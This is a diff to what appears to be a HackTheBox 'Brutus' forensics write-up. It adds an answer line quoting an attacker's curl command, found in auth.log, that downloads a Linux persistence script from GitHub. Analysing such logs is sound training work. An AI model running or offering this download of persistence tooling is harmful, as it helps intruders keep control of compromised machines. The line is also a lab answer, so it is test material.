@@ -120,3 +120,4 @@ grep "cyberjunkie" auth.log | grep "sudo"
 
 ![attackercmd.png](/BrutusHTB/screenshots/attackercmd.png)
 
+Answer: ```/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh```
